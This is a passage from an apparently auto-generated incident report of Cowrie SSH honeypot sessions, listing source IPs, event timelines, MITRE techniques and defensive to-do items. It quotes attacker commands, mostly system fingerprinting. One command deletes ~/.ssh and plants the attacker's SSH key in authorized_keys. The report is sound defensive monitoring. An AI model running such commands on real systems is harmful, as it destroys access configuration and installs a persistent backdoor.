| `2026-08-03 08:23:36` | `cowrie.command.input` |
| `2026-08-03 08:23:36` | `cowrie.command.input` |
| `2026-08-03 08:23:36` | `cowrie.command.input` |
| `2026-08-03 08:23:36` | `cowrie.command.input` |
| `2026-08-03 08:23:36` | `cowrie.command.success` |
| `2026-08-03 08:23:36` | `cowrie.command.input` |
| `2026-08-03 08:23:36` | `cowrie.command.input` |
| `2026-08-03 08:23:36` | `cowrie.command.input` |
| `2026-08-03 08:23:36` | `cowrie.command.input` |
| `2026-08-03 08:23:36` | `cowrie.log.closed` |
| `2026-08-03 08:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d87231978fe1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:25 |
| **Last Seen** | 2026-08-03 08:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:25:05` | `cowrie.session.connect` |
| `2026-08-03 08:25:05` | `cowrie.client.version` |
| `2026-08-03 08:25:05` | `cowrie.client.kex` |
| `2026-08-03 08:25:05` | `cowrie.login.success` |
| `2026-08-03 08:25:07` | `cowrie.session.params` |
| `2026-08-03 08:25:07` | `cowrie.command.input` |
| `2026-08-03 08:25:07` | `cowrie.command.input` |
| `2026-08-03 08:25:07` | `cowrie.command.input` |
| `2026-08-03 08:25:07` | `cowrie.command.input` |
| `2026-08-03 08:25:07` | `cowrie.command.input` |
| `2026-08-03 08:25:07` | `cowrie.command.success` |
| `2026-08-03 08:25:07` | `cowrie.command.input` |
| `2026-08-03 08:25:07` | `cowrie.command.input` |
| `2026-08-03 08:25:07` | `cowrie.command.input` |
| `2026-08-03 08:25:07` | `cowrie.command.input` |
| `2026-08-03 08:25:07` | `cowrie.log.closed` |
| `2026-08-03 08:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-263a63c930f7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:26 |
| **Last Seen** | 2026-08-03 08:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:26:40` | `cowrie.session.connect` |
| `2026-08-03 08:26:40` | `cowrie.client.version` |
| `2026-08-03 08:26:40` | `cowrie.client.kex` |
| `2026-08-03 08:26:41` | `cowrie.login.success` |
| `2026-08-03 08:26:42` | `cowrie.session.params` |
| `2026-08-03 08:26:42` | `cowrie.command.input` |
| `2026-08-03 08:26:42` | `cowrie.command.input` |
| `2026-08-03 08:26:42` | `cowrie.command.input` |
| `2026-08-03 08:26:42` | `cowrie.command.input` |
| `2026-08-03 08:26:42` | `cowrie.command.input` |
| `2026-08-03 08:26:42` | `cowrie.command.success` |
| `2026-08-03 08:26:42` | `cowrie.command.input` |
| `2026-08-03 08:26:42` | `cowrie.command.input` |
| `2026-08-03 08:26:42` | `cowrie.command.input` |
| `2026-08-03 08:26:42` | `cowrie.command.input` |
| `2026-08-03 08:26:42` | `cowrie.log.closed` |
| `2026-08-03 08:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1972db5678ef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:28 |
| **Last Seen** | 2026-08-03 08:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:28:31` | `cowrie.session.connect` |
| `2026-08-03 08:28:31` | `cowrie.client.version` |
| `2026-08-03 08:28:32` | `cowrie.client.kex` |
| `2026-08-03 08:28:32` | `cowrie.login.success` |
| `2026-08-03 08:28:33` | `cowrie.session.params` |
| `2026-08-03 08:28:33` | `cowrie.command.input` |
| `2026-08-03 08:28:33` | `cowrie.command.input` |
| `2026-08-03 08:28:33` | `cowrie.command.input` |
| `2026-08-03 08:28:33` | `cowrie.command.input` |
| `2026-08-03 08:28:33` | `cowrie.command.input` |
| `2026-08-03 08:28:33` | `cowrie.command.success` |
| `2026-08-03 08:28:33` | `cowrie.command.input` |
| `2026-08-03 08:28:33` | `cowrie.command.input` |
| `2026-08-03 08:28:33` | `cowrie.command.input` |
| `2026-08-03 08:28:33` | `cowrie.command.input` |
| `2026-08-03 08:28:33` | `cowrie.log.closed` |
| `2026-08-03 08:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cc606993e64

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:31 |
| **Last Seen** | 2026-08-03 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:31:02` | `cowrie.session.connect` |
| `2026-08-03 08:31:02` | `cowrie.client.version` |
| `2026-08-03 08:31:02` | `cowrie.client.kex` |
| `2026-08-03 08:31:02` | `cowrie.login.success` |
| `2026-08-03 08:31:03` | `cowrie.session.params` |
| `2026-08-03 08:31:03` | `cowrie.command.input` |
| `2026-08-03 08:31:03` | `cowrie.command.input` |
| `2026-08-03 08:31:03` | `cowrie.command.input` |
| `2026-08-03 08:31:03` | `cowrie.command.input` |
| `2026-08-03 08:31:03` | `cowrie.command.input` |
| `2026-08-03 08:31:03` | `cowrie.command.success` |
| `2026-08-03 08:31:03` | `cowrie.command.input` |
| `2026-08-03 08:31:03` | `cowrie.command.input` |
| `2026-08-03 08:31:03` | `cowrie.command.input` |
| `2026-08-03 08:31:03` | `cowrie.command.input` |
| `2026-08-03 08:31:03` | `cowrie.log.closed` |
| `2026-08-03 08:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df9d93f5e05e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-08-03 08:32 |
| **Last Seen** | 2026-08-03 08:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:32:17` | `cowrie.session.connect` |
| `2026-08-03 08:32:17` | `cowrie.client.version` |
| `2026-08-03 08:32:17` | `cowrie.client.kex` |
| `2026-08-03 08:32:19` | `cowrie.login.success` |
| `2026-08-03 08:32:19` | `cowrie.direct-tcpip.request` |
| `2026-08-03 08:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2051b17110c4

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-08-03 08:32 |
| **Last Seen** | 2026-08-03 08:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:32:24` | `cowrie.session.connect` |
| `2026-08-03 08:32:25` | `cowrie.client.version` |
| `2026-08-03 08:32:25` | `cowrie.client.kex` |
| `2026-08-03 08:32:27` | `cowrie.login.success` |
| `2026-08-03 08:32:27` | `cowrie.direct-tcpip.request` |
| `2026-08-03 08:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea1eee67721

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-03 08:33 |
| **Last Seen** | 2026-08-03 08:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:33:53` | `cowrie.session.connect` |
| `2026-08-03 08:33:53` | `cowrie.client.version` |
| `2026-08-03 08:33:53` | `cowrie.client.kex` |
| `2026-08-03 08:33:53` | `cowrie.login.success` |
| `2026-08-03 08:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ef8b4ad064

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-03 08:33 |
| **Last Seen** | 2026-08-03 08:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:33:53` | `cowrie.session.connect` |
| `2026-08-03 08:33:53` | `cowrie.client.version` |
| `2026-08-03 08:33:53` | `cowrie.client.kex` |
| `2026-08-03 08:33:53` | `cowrie.login.success` |
| `2026-08-03 08:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95597698c91d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-03 08:33 |
| **Last Seen** | 2026-08-03 08:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:33:57` | `cowrie.session.connect` |
| `2026-08-03 08:33:57` | `cowrie.client.version` |
| `2026-08-03 08:33:57` | `cowrie.client.kex` |
| `2026-08-03 08:33:57` | `cowrie.login.success` |
| `2026-08-03 08:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a9586e4247b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-03 08:33 |
| **Last Seen** | 2026-08-03 08:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:33:57` | `cowrie.session.connect` |
| `2026-08-03 08:33:57` | `cowrie.client.version` |
| `2026-08-03 08:33:57` | `cowrie.client.kex` |
| `2026-08-03 08:33:57` | `cowrie.login.success` |
| `2026-08-03 08:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efdb5be7295f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:34 |
| **Last Seen** | 2026-08-03 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:34:26` | `cowrie.session.connect` |
| `2026-08-03 08:34:26` | `cowrie.client.version` |
| `2026-08-03 08:34:26` | `cowrie.client.kex` |
| `2026-08-03 08:34:27` | `cowrie.login.success` |
| `2026-08-03 08:34:28` | `cowrie.session.params` |
| `2026-08-03 08:34:28` | `cowrie.command.input` |
| `2026-08-03 08:34:28` | `cowrie.command.input` |
| `2026-08-03 08:34:28` | `cowrie.command.input` |
| `2026-08-03 08:34:28` | `cowrie.command.input` |
| `2026-08-03 08:34:28` | `cowrie.command.input` |
| `2026-08-03 08:34:28` | `cowrie.command.success` |
| `2026-08-03 08:34:28` | `cowrie.command.input` |
| `2026-08-03 08:34:28` | `cowrie.command.input` |
| `2026-08-03 08:34:28` | `cowrie.command.input` |
| `2026-08-03 08:34:28` | `cowrie.command.input` |
| `2026-08-03 08:34:28` | `cowrie.log.closed` |
| `2026-08-03 08:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-473a2a88d9b3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:36 |
| **Last Seen** | 2026-08-03 08:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:36:23` | `cowrie.session.connect` |
| `2026-08-03 08:36:23` | `cowrie.client.version` |
| `2026-08-03 08:36:23` | `cowrie.client.kex` |
| `2026-08-03 08:36:24` | `cowrie.login.success` |
| `2026-08-03 08:36:25` | `cowrie.session.params` |
| `2026-08-03 08:36:25` | `cowrie.command.input` |
| `2026-08-03 08:36:25` | `cowrie.command.input` |
| `2026-08-03 08:36:25` | `cowrie.command.input` |
| `2026-08-03 08:36:25` | `cowrie.command.input` |
| `2026-08-03 08:36:25` | `cowrie.command.input` |
| `2026-08-03 08:36:25` | `cowrie.command.success` |
| `2026-08-03 08:36:25` | `cowrie.command.input` |
| `2026-08-03 08:36:25` | `cowrie.command.input` |
| `2026-08-03 08:36:25` | `cowrie.command.input` |
| `2026-08-03 08:36:25` | `cowrie.command.input` |
| `2026-08-03 08:36:25` | `cowrie.log.closed` |
| `2026-08-03 08:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5917d44bff3

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-08-03 08:37 |
| **Last Seen** | 2026-08-03 08:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:37:52` | `cowrie.session.connect` |
| `2026-08-03 08:37:52` | `cowrie.client.version` |
| `2026-08-03 08:37:53` | `cowrie.client.kex` |
| `2026-08-03 08:37:54` | `cowrie.login.success` |
| `2026-08-03 08:37:55` | `cowrie.session.params` |
| `2026-08-03 08:37:55` | `cowrie.command.input` |
| `2026-08-03 08:37:55` | `cowrie.command.failed` |
| `2026-08-03 08:37:55` | `cowrie.log.closed` |
| `2026-08-03 08:37:56` | `cowrie.session.params` |
| `2026-08-03 08:37:56` | `cowrie.command.input` |
| `2026-08-03 08:37:57` | `cowrie.session.file_download` |
| `2026-08-03 08:37:57` | `cowrie.log.closed` |
| `2026-08-03 08:38:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08f5aba6bc4

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-08-03 08:37 |
| **Last Seen** | 2026-08-03 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:37:57` | `cowrie.session.connect` |
| `2026-08-03 08:37:57` | `cowrie.client.version` |
| `2026-08-03 08:37:57` | `cowrie.client.kex` |
| `2026-08-03 08:37:58` | `cowrie.login.success` |
| `2026-08-03 08:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09e7e084274a

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-08-03 08:37 |
| **Last Seen** | 2026-08-03 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:37:59` | `cowrie.session.connect` |
| `2026-08-03 08:37:59` | `cowrie.client.version` |
| `2026-08-03 08:37:59` | `cowrie.client.kex` |
| `2026-08-03 08:38:00` | `cowrie.login.success` |
| `2026-08-03 08:38:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec63555b67c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 08:38 |
| **Last Seen** | 2026-08-03 08:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:38:01` | `cowrie.session.connect` |
| `2026-08-03 08:38:01` | `cowrie.client.version` |
| `2026-08-03 08:38:01` | `cowrie.client.kex` |
| `2026-08-03 08:38:02` | `cowrie.login.success` |
| `2026-08-03 08:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05efb54efbd4

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 08:38 |
| **Last Seen** | 2026-08-03 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:38:01` | `cowrie.session.connect` |
| `2026-08-03 08:38:01` | `cowrie.client.version` |
| `2026-08-03 08:38:01` | `cowrie.client.kex` |
| `2026-08-03 08:38:02` | `cowrie.login.success` |
| `2026-08-03 08:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-802d3b650298

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:38 |
| **Last Seen** | 2026-08-03 08:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:38:30` | `cowrie.session.connect` |
| `2026-08-03 08:38:30` | `cowrie.client.version` |
| `2026-08-03 08:38:30` | `cowrie.client.kex` |
| `2026-08-03 08:38:31` | `cowrie.login.success` |
| `2026-08-03 08:38:32` | `cowrie.session.params` |
| `2026-08-03 08:38:32` | `cowrie.command.input` |
| `2026-08-03 08:38:32` | `cowrie.command.input` |
| `2026-08-03 08:38:32` | `cowrie.command.input` |
| `2026-08-03 08:38:32` | `cowrie.command.input` |
| `2026-08-03 08:38:32` | `cowrie.command.input` |
| `2026-08-03 08:38:32` | `cowrie.command.success` |
| `2026-08-03 08:38:32` | `cowrie.command.input` |
| `2026-08-03 08:38:32` | `cowrie.command.input` |
| `2026-08-03 08:38:32` | `cowrie.command.input` |
